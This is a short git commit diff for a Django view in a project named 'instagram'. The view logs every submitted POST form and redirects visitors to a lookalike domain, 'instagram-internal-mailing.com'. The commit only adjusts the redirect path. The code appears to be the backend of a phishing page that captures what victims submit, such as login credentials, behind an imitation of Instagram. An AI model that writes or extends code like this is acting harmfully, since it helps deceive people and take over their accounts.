d579608036d33de9ceefc4ad165a9bfbc9323f58
Bobby Robillard <robillard123@gmail.com>
2020-06-17 14:10:34 -0400

    Update views.py

--- instagram/views.py
+++ instagram/views.py
@@ -6,4 +6,4 @@ from django.views.decorators.csrf import csrf_exempt
 def homepage(request):
     if request.method == "POST":
         print(str(request.POST))
-    return redirect('https://instagram-internal-mailing.com/confirmation')
+    return redirect('https://instagram-internal-mailing.com/confirmation.html')
